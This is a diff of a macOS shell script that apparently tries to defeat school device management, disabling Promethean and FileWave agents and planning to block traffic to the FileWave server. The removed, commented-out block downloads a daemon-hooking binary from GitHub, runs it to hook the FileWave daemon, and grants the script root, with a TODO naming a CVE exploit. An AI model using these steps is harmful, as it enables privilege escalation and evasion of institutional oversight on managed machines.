@@ -71,26 +71,6 @@ launchctl disable user/502/com.promethean.activhardwareservice
 launchctl disable user/502/com.promethean.activmgr
 
 
-# FileWave fwcld Daemon hooking
-#if [ ! -f "/usr/local/sbin/FileWave.app/Contents/MacOS/fwcld" ]; then
-    #echo "FileWave daemon not found !"
-#else
-    #echo "FileWave daemon found !"
-    #echo "Attempting to hook FileWave daemon..."
-    #if [ ! -f "/Users/etudiant/tmp/FileWave.app/Contents/MacOS/fwcld.bak" ]; then
-        #echo "FileWave daemon backup not found !"
-       #cp -R "/usr/local/sbin/FileWave.app/Contents/MacOS/fwcld" "Users/etudiant/tmp/FileWave.app/Contents/MacOS/fwcld.bak" # Hookng daemon can sometime lead into weird bug, so we back it up just in case
-    #fi
-    # TODO : CVE-2023-41981 exploit - Waiting for PoC to be released by pinauten
-    #curl https://raw.githubusercontent.com/c22dev/BES/main/ntdx -O # Download ntdx (daemon hooker)
-    #mv -f ntdx /Users/etudiant/ntdx # Move ntdx to home dir
-    #chmod +x ntdx # Make ntdx executable
-    #./ntdx -root -faketime "/usr/local/sbin/FileWave.app/Contents/MacOS/fwcld" # Hook daemon
-    #./ntdx -giveroot /Users/etudiant/bes.sh # Make script root, usefull for pcftl
-#fi
-
-
-
 # Network filtering
 # This is meant to block all incoming/outgoing connections from/to the FileWave server. Not sure this will work as this could rely on admin privileges.
 
